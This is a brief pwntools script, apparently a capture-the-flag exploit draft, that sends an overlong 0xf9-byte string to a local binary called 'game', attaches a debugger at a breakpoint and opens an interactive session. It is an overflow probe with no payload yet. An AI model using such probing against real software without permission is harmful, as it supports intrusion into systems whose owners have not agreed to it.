from pwn import *

sh = process('./game')

sh.recvuntil("What's your magic string?\n")
fmt_str = '\x00'*0xf9
sh.sendline('a'*0xf9)

gdb.attach(sh,'b *0x565563c4')

sh.interactive()
